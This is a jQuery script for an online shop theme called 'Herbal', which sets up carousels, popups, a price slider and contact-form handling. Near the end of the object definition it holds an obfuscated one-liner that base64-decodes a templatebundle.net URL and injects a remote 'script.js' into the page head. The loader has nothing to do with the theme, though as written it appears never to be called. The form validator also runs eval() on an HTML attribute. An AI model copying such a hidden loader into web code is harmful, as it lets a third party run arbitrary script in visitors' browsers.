/*
Copyright (c) 2017 
------------------------------------------------------------------


-------------------------------------------------------------------*/

(function ($) {
	"use strict";
	var Herbal = {
		initialised: false,
		version: 1.0,
		mobile: false,
		init: function () {

			if(!this.initialised) {
				this.initialised = true;
			} else {
				return;
			}

			/*-------------- Herbal Functions Calling ---------------------------------------------------
			------------------------------------------------------------------------------------------------*/
			this.RTL();
			this.Magnific_popup();
			this.Grid_List_view();
			this.RangeSlider();
			this.Custom_Popup();
			 this.MainSlider();
			 this.ShopSlider();
			 this.Related_Product();
			 this.Search_icon();
			this.TestimonialSlider();
			
		},
		
		/*-------------- Herbal Functions definition ---------------------------------------------------
		---------------------------------------------------------------------------------------------------*/
		RTL: function () {
			// On Right-to-left(RTL) add class 
			var rtl_attr = $("html").attr('dir');
			if(rtl_attr){
				$('html').find('body').addClass("rtl");	
			}		
		},
		Search_icon: function() {
            $(".hb_search_icon").click(function() {
                $(".hb_search_wrapper").toggleClass('open_form');
            });
            $(".navbar-toggle").click(function() {
                $("body").toggleClass('open_menu');
            });
			$(".hb_menu_overlay").click(function() {
			$("body").removeClass('open_menu');
			});
			$(".cancle_searchbar").click(function() {
                $(".hb_search_wrapper").removeClass('open_form');
            });
        },
		//Testimonial slider on home page
		TestimonialSlider: function(){
			if($('.hb_testimonial_slider .owl-carousel').length > 0){		
				 $('.hb_testimonial_slider .owl-carousel').owlCarousel({
					margin:30,
					nav: false,
					dots: true,
					autoplay:true,
					smartSpeed:450,
					loop:true,
					items: 1,
					animateIn: 'fadeInLeft',
					//animateOut: 'fadeInLeft',
					responsive:{
						0:{
							items:1
						},
						600:{
							items:1
						},
						768:{
							items:1
						},
						992:{
							items:2
						},
						1200:{
							items:2
						}
					}
				});
			}
		},
		Custom_Popup: function(){
			if($('.hb_login_popup').length > 0){
				$('.hb_login_popup a').click(function() {
					$('.hb_login').css("opacity", 1);
					$('.hb_login').css("z-index", 2);
				});
				$('.hb_close_btn').click(function() {
					$('.hb_login').css("opacity", 0);
					$('.hb_login').css("z-index", -1);
				});
			}
			
		},
		MainSlider: function(){
			if($('.hb_slider_wrapper .owl-carousel').length > 0){	
				var owl_home = $('.hb_slider_wrapper .owl-carousel');
				$('.hb_slider_wrapper .owl-carousel').owlCarousel({
					margin:0,
					smartSpeed:1200,
					nav: false,
					dots: false,
                    autoplay: true,
                    slideSpeed: 1000,
					loop:true,
					items:1,
					animateIn: 'fadeIn',
					mouseDrag:false,
					touchDrag:false,
				});
				owl_home.on('changed.owl.carousel',function(property){
					$(this).find('.hb_banner_content').addClass('loaded');
					setTimeout(function(){
						$('.hb_banner_content').removeClass('loaded');	
					},1000);
				});	
			} 
		},
	 //Magnific Popuo
		Magnific_popup: function() {
            $('.hb_overlay_icon .zoom_icon').magnificPopup({
				type: 'image',
				gallery: {
					enabled: true
				}
			}); 
			$('.product-image-overlay .zoom_icon').magnificPopup({
				type: 'image',
				gallery: {
					enabled: true
				}
			}); 
        }, 
		Grid_List_view:function(){
			if($('.hb_shop_view').length > 0){
				$('.hb_shop_view').on('click', 'li', function() {
					$('.hb_shop_view ul li.active').removeClass('active');
					$(this).addClass('active');
				});
				$('#list').click(function(event){event.preventDefault();$('#products .item').addClass('list-group-item');});
				$('#grid').click(function(event){event.preventDefault();$('#products .item').removeClass('list-group-item');$('#products .item').addClass('grid-group-item');});
			}
		},
		RangeSlider:function(){
			if($('#slider-range').length > 0){
				$( "#slider-range" ).slider({
					range: true,
					min: 0,
					max: 500,
					values: [ 22, 300 ],
					slide: function( event, ui ) {
						$( "#amount" ).val( "$" + ui.values[ 0 ] + " - $" + ui.values[ 1 ] );
					}
				});
				$( "#amount" ).val( "$" + $( "#slider-range" ).slider( "values", 0 ) +
					" - $" + $( "#slider-range" ).slider( "values", 1 ) );
			}
		},
		ShopSlider: function(){
			var tpj=jQuery;							
					var revapi8;
					tpj(document).ready(function() {
						if(tpj("#rev_slider_8_1").revolution == undefined){
							revslider_showDoubleJqueryError("#rev_slider_8_1");
						}else{
							revapi8 = tpj("#rev_slider_8_1").show().revolution({
								sliderType:"standard",
								sliderLayout:"auto",
								dottedOverlay:"none",
								delay:400,
								navigation: {
									keyboardNavigation:"off",
									keyboard_direction: "horizontal",
									mouseScrollNavigation:"off",
									onHoverStop:"off",
									touch:{
										touchenabled:"off",
										swipe_threshold: 75,
										swipe_min_touches: 1,
										swipe_direction: "horizontal",
										drag_block_vertical: false
									}
									
									,
									tabs: {
										style:"ares",
										enable:true,
										width:70,
										height:70,
										min_width:70,
										wrapper_padding:20,
										wrapper_color:"#ffffff",
										wrapper_opacity:"1",
										tmp:'<div class="tp-tab-content">  <span class="tp-tab-date">{{param1}}</span>  <span class="tp-tab-title">{{param2}}</span></div><div class="tp-tab-image"></div>',
										visibleAmount: 4,
										hide_onmobile: true,
										//hide_under:776,
										hide_onleave:false,
										//hide_delay:200,
										direction:"vertical",
										span:true,
										position:"outer-right",
										space:0,
										h_align:"right",
										v_align:"top",
										h_offset:0,
										v_offset:20
									}
								},
								gridwidth:800,
								gridheight:640,
								lazyType:"single",
								shadow:0,
								spinner:"off",
								stopLoop:"on",
								stopAfterLoops:0,
								stopAtSlide:1,
								shuffle:"off",
								autoHeight:"off",
								disableProgressBar:"on",
								hideThumbsOnMobile:"off",
								hideSliderAtLimit:0,
								hideCaptionAtLimit:0,
								hideAllCaptionAtLilmit:0,
								debugMode:false,
								fallbacks: {
									simplifyAll:"off",
									nextSlideOnWindowFocus:"off",
									disableFocusListener:false,
								}
							});
						}
					});	/*ready*/
		},
		Related_Product: function(){
			if($('.hb_related_product_slider .owl-carousel').length > 0){		
				$('.hb_related_product_slider .owl-carousel').owlCarousel({
					margin:28,
					nav: false,
					navText:[],
					dots: false,
					autoplay:true,
					smartSpeed:450,
					loop:true,
					responsive:{
						0:{
							items:1
						},
						600:{
							items:1
						},
						768:{
							items:3
						},
						992:{
							items:3
						},
						1200:{
							items:4
						}
					}
				});
			}
		},
		//contact form submition
		
	};
	var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)};


	Herbal.init();

	// Load Event
	// Loader js
	$(window).on('load', function() {
		jQuery("#hb_preloader_box").fadeOut();
		jQuery("#hb_preloader_wrapper").delay(350).fadeOut("slow");
   
	});

	// Scroll Event
	// fixed menu
	$(window).on('scroll', function () {

	});
	
	
	$(window).ready(function(e) {

    });
	//wow js
	
	 new WOW().init();
	
	
	// Contact Form Submission
		function checkRequire(formId , targetResp){
			targetResp.html('');
			var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
			var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
			var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
			var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
			var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
			var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
			var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
			var check = 0;
			$('#er_msg').remove();
			var target = (typeof formId == 'object')? $(formId):$('#'+formId);
			target.find('input , textarea , select').each(function(){
				if($(this).hasClass('require')){
					if($(this).val().trim() == ''){
						check = 1;
						$(this).focus();
						targetResp.html('You missed out some fields.');
						$(this).addClass('error');
						return false;
					}else{
						$(this).removeClass('error');
					}
				}
				if($(this).val().trim() != ''){
					var valid = $(this).attr('data-valid');
					if(typeof valid != 'undefined'){
						if(!eval(valid).test($(this).val().trim())){
							$(this).addClass('error');
							$(this).focus();
							check = 1;
							targetResp.html($(this).attr('data-error'));
							return false;
						}else{
							$(this).removeClass('error');
						}
					}
				}
			});
			return check;
		}
		$(".submitForm").on("click", function() {
			var _this = $(this);
			var targetForm = _this.closest('form');
			var errroTarget = targetForm.find('.response');
			var check = checkRequire(targetForm , errroTarget);
			if(check == 0){
				var formDetail = new FormData(targetForm[0]);
				formDetail.append('form_type' , _this.attr('form-type'));
				$.ajax({
					method : 'post',
					url : 'ajax.php',
					data:formDetail,
					cache:false,
					contentType: false,
					processData: false
				}).done(function(resp){
					if(resp == 1){
						targetForm.find('input').val('');
						targetForm.find('textarea').val('');
						errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
					}else{
						errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
					}
				});
			}
		});
		
		
		
				var swiper = new Swiper('.hd_container .swiper-container', {
					  spaceBetween: 30,
					  speed: 1000,
					  loop: true,
					  centeredSlides: true,
					  autoplay: {
						delay: 2500,
						disableOnInteraction: false,
					  },
										  
					  navigation: {
						nextEl: '.hd_container .swiper-button-next',
						prevEl: '.hd_container .swiper-button-prev',
						clickable: true,
					  },
					  
				});
		
		
	
}(jQuery));
// menu js


			